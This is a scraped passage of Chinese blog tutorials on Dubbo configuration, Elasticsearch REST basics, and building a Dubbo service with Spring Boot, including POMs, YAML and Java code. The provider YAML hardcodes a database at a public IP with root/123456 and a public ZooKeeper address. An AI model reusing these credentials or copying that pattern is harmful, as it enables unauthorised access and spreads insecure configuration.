当某一台提供者挂时，原本发往该提供者的请求，基于虚拟节点，平摊到其它提供者，不会引起剧烈变动。 # 1.9.4 直连提供者 在开发及测试环境下，经常需要绕过注册中心，只测试指定服务提供者，所以，这种情况下，我们只需要直接连接服务端的地即可，其实，这种方法在前面的讲解已经使用到了，第一种讲解的方式就是这种方式，因为这种方式简单。 使用方法如下所示： 123&lt;dubbo:reference id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; url=&quot;dubbo://192.168.234.1:20880/com.sihai.dubbo.provider.service.ProviderService&quot;/&gt; 说明：可以看到，只要在消费端在・ dubbo:reference 节点使用 url 给出服务端的方法即可。 # 1.9.5 只订阅 只订阅就是只能够订阅服务端的服务，而不能够注册。 引用官方的使用场景如下： 为方便开发测试，经常会在线下共用一个所有服务可用的注册中心，这时，如果一个正在开发中的服务提供者注册，可能会影响消费者不能正常运行。 可以让服务提供者开发方，只订阅服务 (开发的服务可能依赖其它服务)，而不注册正在开发的服务，通过直连测试正在开发的服务。 1&lt;dubbo:registry register=&quot;false&quot; protocol=&quot;zookeeper&quot; address=&quot;localhost:2181,localhost:2182,localhost:2183&quot; check=&quot;false&quot;/&gt; 1、使用只订阅方式 当在服务提供端使用 register=&quot;false&quot; 的时候，我们使用下面的方式获取服务端的服务； 12&lt;dubbo:reference cluster=&quot;failover&quot; retries=&quot;2&quot; check=&quot;false&quot; id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot;/&gt; 启动信息 发现，这时候并不是向注册中心 zookeeper 注册，而只是做了发布服务和启动 netty 。 2、不使用只订阅方式 1&lt;dubbo:registry protocol=&quot;zookeeper&quot; address=&quot;localhost:2181,localhost:2182,localhost:2183&quot; check=&quot;false&quot;/&gt; 启动信息 可以发现，这里就向注册中心 zookeeper 注册了。 # 1.9.6 只注册 只注册正好跟前面的只订阅相反，这个时候可以向注册中心注册，但是，消费端却不能够读到服务。 应用场景 如果有两个镜像环境，两个注册中心，有一个服务只在其中一个注册中心有部署，另一个注册中心还没来得及部署，而两个注册中心的其它应用都需要依赖此服务。这个时候，可以让服务提供者方只注册服务到另一注册中心，而不从另一注册中心订阅服务。 使用说明 1&lt;dubbo:registry subscribe=&quot;false&quot; address=&quot;localhost:2181&quot;&gt;&lt;/dubbo:registry&gt; 在服务端的 dubbo:registry 节点下使用 subscribe=&quot;false&quot; 来声明这个服务是只注册的服务。 这个时候消费端调用的时候是不能调用的。 # 1.9.7 多协议机制 在前面我们使用的协议都是 dubbo 协议，但是 dubbo 除了支持这种协议外还支持其他的协议，比如， rmi、hessian 等，另外，而且还可以用多种协议同时暴露一种服务。 使用方法 1、一种接口使用一种协议 先声明多种协议 123&lt;!--当前服务发布所依赖的协议；webserovice、Thrift、Hessain、http--&gt; &lt;dubbo:protocol name=&quot;dubbo&quot; port=&quot;20880&quot;/&gt; &lt;dubbo:protocol name=&quot;rmi&quot; port=&quot;1099&quot; /&gt; 然后在发布接口的时候使用具体协议 1234567&lt;!--服务发布的配置，需要暴露的服务接口--&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot;/&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot; protocol=&quot;rmi&quot;/&gt; 在输出日志中，就可以找到 rmi 发布的接口。 1rmi://192.168.234.1:1099/com.sihai.dubbo.provider.service.ProviderService?anyhost=true&amp;application=provider&amp;bean.name=com.sihai.dubbo.provider.service.ProviderService&amp;cluster=failover&amp;dubbo=2.0.2&amp;generic=false&amp;interface=com.sihai.dubbo.provider.service.ProviderService&amp;methods=SayHello&amp;owner=sihai&amp;pid=796&amp;retries=2&amp;side=provider&amp;timestamp=1564281053185, dubbo version: 2.6.6, current host: 192.168.234.1 2、一种接口使用多种协议 声明协议和上面的方式一样，在发布接口的时候有一点不一样。 123&lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot; protocol=&quot;rmi,dubbo&quot;/&gt; 说明： protocol 属性，可以用 , 隔开，使用多种协议。 # 1.9.8 多注册中心 Dubbo 支持同一服务向多注册中心同时注册，或者不同服务分别注册到不同的注册中心上去，甚至可以同时引用注册在不同注册中心上的同名服务。 服务端多注册中心发布服务 一个服务可以在不同的注册中心注册，当一个注册中心出现问题时，可以用其他的注册中心。 注册 1234&lt;!--多注册中心--&gt; &lt;dubbo:registry protocol=&quot;zookeeper&quot; id=&quot;reg1&quot; timeout=&quot;10000&quot; address=&quot;localhost:2181&quot;/&gt; &lt;dubbo:registry protocol=&quot;zookeeper&quot; id=&quot;reg2&quot; timeout=&quot;10000&quot; address=&quot;localhost:2182&quot;/&gt; &lt;dubbo:registry protocol=&quot;zookeeper&quot; id=&quot;reg3&quot; timeout=&quot;10000&quot; address=&quot;localhost:2183&quot;/&gt; 发布服务 1234567&lt;!--服务发布的配置，需要暴露的服务接口--&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot; registry=&quot;reg1&quot;/&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot; protocol=&quot;rmi&quot; registry=&quot;reg2&quot;/&gt; 说明：使用 registry=&quot;reg2&quot; 指定该接口使用的注册中心，同时也可以使用多个 ， 用，隔开，例如， registry=&quot;reg1,,reg2&quot; 。 消费端多注册中心引用服务 首先，先向不同注册中心注册； 1234&lt;!--多注册中心--&gt; &lt;dubbo:registry protocol=&quot;zookeeper&quot; id=&quot;reg1&quot; timeout=&quot;10000&quot; address=&quot;localhost:2181&quot;/&gt; &lt;dubbo:registry protocol=&quot;zookeeper&quot; id=&quot;reg2&quot; timeout=&quot;10000&quot; address=&quot;localhost:2182&quot;/&gt; &lt;dubbo:registry protocol=&quot;zookeeper&quot; id=&quot;reg3&quot; timeout=&quot;10000&quot; address=&quot;localhost:2183&quot;/&gt; 其次，不同的消费端服务引用使用不同的注册中心； 12345&lt;!--不同的服务使用不同的注册中心--&gt; &lt;dubbo:reference cluster=&quot;failover&quot; retries=&quot;2&quot; check=&quot;false&quot; id=&quot;providerService&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; registry=&quot;reg1&quot;/&gt; &lt;dubbo:reference cluster=&quot;failover&quot; retries=&quot;2&quot; check=&quot;false&quot; id=&quot;providerService2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; registry=&quot;reg2&quot;/&gt; 说明：上面分别使用注册中心 1 和注册中心 2 。 # 1.9.9 多版本 不同的服务是有版本不同的，版本可以更新并且升级，同时，不同的版本之间是不可以调用的。 1234567&lt;!--服务发布的配置，需要暴露的服务接口--&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot; registry=&quot;reg1&quot; version=&quot;1.0.0&quot;/&gt; &lt;dubbo:service cluster=&quot;failover&quot; retries=&quot;2&quot; interface=&quot;com.sihai.dubbo.provider.service.ProviderService&quot; ref=&quot;providerService&quot; protocol=&quot;rmi&quot; registry=&quot;reg2&quot; version=&quot;1.0.0&quot;/&gt; 加入了版本控制。 # 1.9.10 日志管理 dubbo 也可以将日志信息记录或者保存到文件中的。 1、使用 accesslog 输出到 log4j 12&lt;dubbo:protocol accesslog=&quot;true&quot; name=&quot;dubbo&quot; port=&quot;20880&quot;/&gt; &lt;dubbo:protocol accesslog=&quot;true&quot; name=&quot;rmi&quot; port=&quot;1099&quot; /&gt; 2、输出到文件 12&lt;dubbo:protocol accesslog=&quot;http://localhost/log.txt&quot; name=&quot;dubbo&quot; port=&quot;20880&quot;/&gt; &lt;dubbo:protocol accesslog=&quot;http://localhost/log2.txt&quot; name=&quot;rmi&quot; port=&quot;1099&quot; /&gt; # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90Dubbo%E3%80%91Dubbo%E8%AF%A6%E8%A7%A3%EF%BC%8C%E7%94%A8%E5%BF%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B0%B1%E5%A4%9F%E4%BA%86%E3%80%90%E9%87%8D%E7%82%B9%E3%80%91/"},{"title":"ElasticSearch 处理检索海量数据“神器”？","text":"海量数据我们是如何去检索数据呢，如何快速定位呢，去查询后台数据库吗？还是走缓存，是什么缓存能承载这么大的符合呢，并且快速检索出来？对于海量的数据是对系统极大的压力，我们该从什么角度去处理这个棘手的问题呢？ # ElasticSearch 处理检索海量数据 “神器”？ # 1.1 介绍 Elasticsearch 是一个基于 Lucene 的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于 RESTful web 接口。Elasticsearch 是用 Java 语言开发的，并作为 Apache 许可条款下的开放源码发布，是一种流行的企业级搜索引擎。Elasticsearch 用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在 Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby 和许多其他语言中都是可用的。根据 DB-Engines 的排名显示，Elasticsearch 是最受欢迎的企业搜索引擎，其次是 Apache Solr，也是基于 Lucene。 # 1.2 es 介绍 “官网地址们” 官方文档 中文官方文档 3. 中文社区 # 2.1 基本介绍 1、Index（索引） 动词，相当于 MySQL 中的 insert； 名词，相当于 MySQL 中的 Database 2、Type（类型） 在 Index（索引）中，可以定义一个或多个类型。 类似于 MySQL 中的 Table；每一种类型的数据放在一起； 3、Document（文档） 保存在某个索引（Index）下，某种类型（Type）的一个数据（Document），文档是 JSON 格 式的，Document 就像是 MySQL 中的某个 Table 里面的内容； # 2.2 ES 是如何进行检索的呢 # 2.3 ElasticSearch 长啥样呢，有无操作界面 ElasticSearch 是有操作界面的，它需要配置 Kibana，和它一起操作方便，也是主流的一种搭配方式，安装这两个工具，不做过多介绍 Kibana 介绍 Kibana 是一款开源的数据分析和可视化平台，它是 Elastic Stack 成员之一，设计用于和 Elasticsearch 协作。您可以使用 Kibana 对 Elasticsearch 索引中的数据进行搜索、查看、交互操作。您可以很方便的利用图表、表格及地图对数据进行多元化的分析和呈现 # 2.4 初步检索 12345678910111213141、_catGET /_cat/nodes：查看所有节点GET /_cat/health：查看 es 健康状况GET /_cat/master：查看主节点GET /_cat/indices：查看所有索引 show databases;2、索引一个文档（保存）保存一个数据，保存在哪个索引的哪个类型下，指定用哪个唯一标识PUT customer/external/1；在 customer 索引下的 external 类型下保存 1 号数据为12345678PUT 和 POST 都可以，POST 新增。如果不指定 id，会自动生成 id。指定 id 就会修改这个数据，并新增版本号PUT 可以新增可以修改。PUT 必须指定 id；由于 PUT 需要指定 id，我们一般都用来做修改操作，不指定 id 会报错1234 # 2.4.1 在 postMan 测试数据 1234PUT customer/external/1{ &quot;name&quot;: &quot;John Doe&quot;}123 2.4.2、查询文档 1234567891011121314GET customer/external/11结果：{ &quot;_index&quot;: &quot;customer&quot;, //在哪个索引&quot;_type&quot;: &quot;external&quot;, //在哪个类型&quot;_id&quot;: &quot;1&quot;, //记录 id&quot;_version&quot;: 2, //版本号&quot;_seq_no&quot;: 1, //并发控制字段，每次更新就会+1，用来做乐观锁&quot;_primary_term&quot;: 1, //同上，主分片重新分配，如重启，就会变化&quot;found&quot;: true, &quot;_source&quot;: { //真正的内容&quot;name&quot;: &quot;John Doe&quot;}}1234567891011 2.4.3、更新文档 123456789101112131415161718192021222324POST customer/external/1/_update{ &quot;doc&quot;:{ &quot;name&quot;: &quot;John Doew&quot;}}或者POST customer/external/1{ &quot;name&quot;: &quot;John Doe2&quot;}或者PUT customer/external/1{ &quot;name&quot;: &quot;John Doe&quot;}? 不同：POST 操作会对比源文档数据，如果相同不会有什么操作，文档 version 不增加PUT 操作总会将数据重新保存并增加 version 版本；带_update 对比元数据如果一样就不进行任何操作。看场景；对于大并发更新，不带 update；对于大并发查询偶尔更新，带 update；对比更新，重新计算分配规则。? 更新同时增加属性POST customer/external/1/_update{ &quot;doc&quot;: { &quot;name&quot;: &quot;Jane Doe&quot;, &quot;age&quot;: 20 }}PUT 和 POST 不带_update 也可以1234567891011121314151617181920212223 2.4.4、删除文档 &amp; 索引 123DELETE customer/external/1DELETE customer12 2.4.5 bulk 批量 API 1234567891011121314151617181920212223POST customer/external/_bulk{&quot;index&quot;:{&quot;_id&quot;:&quot;1&quot;}}{&quot;name&quot;: &quot;John Doe&quot; }{&quot;index&quot;:{&quot;_id&quot;:&quot;2&quot;}}{&quot;name&quot;: &quot;Jane Doe&quot; }语法格式：{ action: { metadata }}\\n{ request body }\\n{ action: { metadata }}\\n{ request body }\\n复杂实例：POST /_bulk{ &quot;delete&quot;: { &quot;_index&quot;: &quot;website&quot;, &quot;_type&quot;: &quot;blog&quot;, &quot;_id&quot;: &quot;123&quot; }}{ &quot;create&quot;: { &quot;_index&quot;: &quot;website&quot;, &quot;_type&quot;: &quot;blog&quot;, &quot;_id&quot;: &quot;123&quot; }}{ &quot;title&quot;: &quot;My first blog post&quot; }{ &quot;index&quot;: { &quot;_index&quot;: &quot;website&quot;, &quot;_type&quot;: &quot;blog&quot; }}{ &quot;title&quot;: &quot;My second blog post&quot; }{ &quot;update&quot;: { &quot;_index&quot;: &quot;website&quot;, &quot;_type&quot;: &quot;blog&quot;, &quot;_id&quot;: &quot;123&quot;, &quot;_retry_on_conflict&quot; : 3} }{ &quot;doc&quot; : {&quot;title&quot; : &quot;My updated blog post&quot;} }bulk API 以此按顺序执行所有的 action（动作）。如果一个单个的动作因任何原因而失败，它将继续处理它后面剩余的动作。当 bulk API 返回时，它将提供每个动作的状态（与发送的顺序相同），所以您可以检查是否一个指定的动作是不是失败了。12345678910111213141516171819202122 # 2.4 SearchAPI 1234567891011121314151617ES 支持两种基本方式检索 :? 一个是通过使用 REST request URI 发送搜索参数（uri+检索参数）? 另一个是通过使用 REST request body 来发送它们（uri+请求体）1）、检索信息? 一切检索从_search 开始GET bank/_search 检索 bank 下所有信息，包括 type 和 docsGET bank/_search?q=*&amp;sort=account_number:asc 请求参数方式检索响应结果解释：took - Elasticsearch 执行搜索的时间（毫秒）time_out - 告诉我们搜索是否超时_shards - 告诉我们多少个分片被搜索了，以及统计了成功/失败的搜索分片hits - 搜索结果hits.total - 搜索结果hits.hits - 实际的搜索结果数组（默认为前 10 的文档）sort - 结果的排序 key（键）（没有则按 score 排序）score 和 max_score –相关性得分和最高得分（全文检索用）12345678910111213141516 其他在 Kibana 操作的语句，都可以在 es 官网去查询，不做过多的赘述！！！ # 2.5、Mapping 映射 Mapping（映射） Mapping 是用来定义一个文档（document），以及它所包含的属性（field）是如何存储和 索引的。比如，使用 mapping 来定义： ? 哪些字符串属性应该被看做全文本属性（full text fields）。 ? 哪些属性包含数字，日期或者地理位置。 ? 文档中的所有属性是否都能被索引（_all 配置）。 ? 日期的格式。 ? 自定义映射规则来执行动态添加属性。 # 2.6 分词 个 tokenizer（分词器）接收一个字符流，将之分割为独立的 tokens（词元，通常是独立 的单词），然后输出 tokens 流。 例如，whitespace tokenizer 遇到空白字符时分割文本。它会将文本 “Quick brown fox!” 分割 为 [Quick, brown, fox!]。 该 tokenizer（分词器）还负责记录各个 term（词条）的顺序或 position 位置（用于 phrase 短 语和 word proximity 词近邻查询），以及 term（词条）所代表的原始 word（单词）的 start （起始）和 end（结束）的 character offsets（字符偏移量）（用于高亮显示搜索的内容）。 Elasticsearch 提供了很多内置的分词器，可以用来构建 custom analyzers（自定义分词器）。 2.6.1 安装分词器 注意：不能用默认 elasticsearch-plugin install xxx.zip 进行自动安装 https://github.com/medcl/elasticsearch-analysis-ik/releases?after=v6.4.2 对应 es 版本安装 # 总结 elasticsearch 功能是非常强大的，可以作为生成环境的 ELK 日志存储，方便检索，也可以部署集群，提高效率，最主要是它是走内存的，查询效率极高，为大数据检索而生！！！ # 使用场景（Es） # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/05/24/%E3%80%90ElasticSearch%E3%80%91ElasticSearch%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"},{"title":"【Dubbo】使用Dubbo整合SpringBoot搭建一个服务","text":"# 【Dubbo】使用 Dubbo 整合 SpringBoot 搭建一个服务 # 文章目录 开发前提 构建 Springboot 项目 开发 api 模块 开发生产者模块 第一步：导入依赖 第二步：添加配置 第三步：编写启动类 第四步：添加 mapper 接口 第五步：实现接口： 第六步：编写 controller 层接口 开发消费者模块 第一步：导入依赖 第二步：添加配置 第三步：编写启动类： 第四步：编写调用生产者接口 测试 # 开发前提 由于 dubbo 的注册中心用的是 zookeeper，所以首先需要安装 zookeeper。 # 构建 Springboot 项目 第一步：选择新建 project 或者 module，在界面中选择 maven 点击 next: 第二步：填上项目的基本信息点击 Finish： 第三步：右击项目 new -&gt; Module: 第四步：在界面中选择 maven 点击 next: 第五步：填上项目的基本信息点击 Finish： 第六步：重复第三，四，五步，分别创建项目需要的 dubbo-api,dubbo-provider,dubbo-customer 几个模块，如下： 第七步：导入父工程依赖： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.demo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;modules&gt; &lt;module&gt;dubbo-provider&lt;/module&gt; &lt;module&gt;dubbo-customer&lt;/module&gt; &lt;module&gt;dubbo-api&lt;/module&gt; &lt;/modules&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;source.level&gt;1.8&lt;/source.level&gt; &lt;target.level&gt;1.8&lt;/target.level&gt; &lt;lombok.version&gt;1.18.16&lt;/lombok.version&gt; &lt;skip_maven_deploy&gt;true&lt;/skip_maven_deploy&gt; &lt;spring-boot-dependencies.version&gt;2.4.1&lt;/spring-boot-dependencies.version&gt; &lt;spring-cloud-dependencies.version&gt;Dalston.SR4&lt;/spring-cloud-dependencies.version&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;dubbo.version&gt;3.0.2.1&lt;/dubbo.version&gt; &lt;spring-dubbo.version&gt;2.0.0&lt;/spring-dubbo.version&gt; &lt;lombok.version&gt;1.18.16&lt;/lombok.version&gt; &lt;/properties&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;!-- 统一jar版本管理，避免使用 spring-boot-parent --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-boot-dependencies.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-bom&lt;/artifactId&gt; &lt;version&gt;${dubbo.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--dubbo 和 springboot 整合的包--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${dubbo.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;${lombok.version}&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt;&lt;/project&gt; # 开发 api 模块 user 实体类： 1234567891011121314151617181920212223package com.demo.api.entity;import lombok.Data;import java.io.Serializable;/** * @Author: laz * @CreateTime: 2022-10-26 10:56 * @Version: 1.0 */@Datapublic class User implements Serializable { private Long id; private String username; private String password;} 创建本次测试的接口： 12345678package com.demo.api.service;import com.demo.api.entity.User;public interface IUserService { User selectUserById(Long id);} # 开发生产者模块 # 第一步：导入依赖 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt; &lt;groupId&gt;com.demo&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;dubbo-provider&lt;/artifactId&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.demo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--dubbo 与 spring-boot 整合包--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--springboot 启动核心包--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--springboot rest --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-registry-zookeeper&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt; &lt;/dependency&gt; &lt;!--mysql 的驱动--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.yml&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt;&lt;/project&gt; # 第二步：添加配置 1234567891011121314151617181920212223242526272829303132333435server: port: 8081spring: application: name: dubbo-samples-privider-springCloud #配置数据源信息 datasource: #配置连接数据库的各个信息 driver-class-name: com.mysql.cj.jdbc.Driver #设置字符集 url: jdbc:mysql://8.142.127.37:3306/test?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;transformedBitIsBoolean=true&amp;serverTimezone=GMT%2B8&amp;nullCatalogMeansCurrent=true&amp;allowPublicKeyRetrieval=true username: root password: 123456mybatis-plus: #配置类型别名所对应的包 type-aliases-package: com.demo.provider.entity #配置SQL输出语句com.winsun.dataclean.mapper mapper-locations: com/demo/provider/mapper/*.xmldubbo: application: name: ${spring.application.name} registry: address: zookeeper://43.139.86.193:2181 timeout: 2000 protocol: name: dubbo port: 20890 # 扫描 @DubboService 注解 scan: base-packages: com.demo.provider.service.impl # 第三步：编写启动类 12345678910111213141516171819202122package com.demo.provider;import org.apache.dubbo.config.spring.context.annotation.EnableDubbo;import org.mybatis.spring.annotation.MapperScan;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;/** * @Author: laz * @CreateTime: 2022-10-26 11:05 * @Version: 1.0 */@EnableDubbo@SpringBootApplication@MapperScan(&quot;com.demo.provider.mapper&quot;)public class ProviderApp { public static void main(String[] args) { SpringApplication.run(ProviderApp.class,args); System.out.println(&quot;生产者启动完毕&quot;); }} # 第四步：添加 mapper 接口 12345678910111213package com.demo.provider.mapper;import com.demo.api.entity.User;/** * @Author: laz * @CreateTime: 2022-10-26 11:01 * @Version: 1.0 */public interface UserMapper { User selectUserById(Long id);} xml: 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot; &gt;&lt;mapper namespace=&quot;com.demo.provider.mapper.UserMapper&quot;&gt; &lt;select id=&quot;selectUserById&quot; resultType=&quot;com.demo.api.entity.User&quot;&gt; select * from user where id = #{id} &lt;/select&gt;&lt;/mapper&gt; # 第五步：实现接口： 123456789101112131415161718192021222324package com.demo.provider.service.impl;import com.demo.api.entity.User;import com.demo.api.service.IUserService;import com.demo.provider.mapper.UserMapper;import lombok.AllArgsConstructor;import org.apache.dubbo.config.annotation.DubboService;/** * @Author: laz * @CreateTime: 2022-10-26 11:00 * @Version: 1.0 */@DubboService@AllArgsConstructorpublic class UserServiceImpl implements IUserService { private final UserMapper userMapper; public User selectUserById(Long id) { User user = userMapper.selectUserById(id); return user; }} # 第六步：编写 controller 层接口 1234567891011121314151617181920212223242526 package com.demo.provider.controller;import com.demo.api.entity.User;import com.demo.api.service.IUserService;import lombok.AllArgsConstructor;import org.springframework.web.bind.annotation.PathVariable;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;/** * @Author: laz * @CreateTime: 2022-10-26 11:53 * @Version: 1.0 */@RestController@RequestMapping(&quot;/provider&quot;)@AllArgsConstructorpublic class UserController { private final IUserService userService; @RequestMapping(&quot;/selectUserById/{id}&quot;) public User selectUserById(@PathVariable(&quot;id&quot;)Long id){ return userService.selectUserById(id); }} # 开发消费者模块 # 第一步：导入依赖 123456789101112131415161718192021222324252627282930313233343536373839&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;parent&gt; &lt;artifactId&gt;dubbo-demo&lt;/artifactId&gt; &lt;groupId&gt;com.demo&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;dubbo-customer&lt;/artifactId&gt; &lt;dependencies&gt; &lt;!--dubbo-samples-springcloud-api 项目 依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;com.demo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt; &lt;artifactId&gt;dubbo-registry-zookeeper&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; # 第二步：添加配置 12345678910111213server: port: 8082spring: application: name: 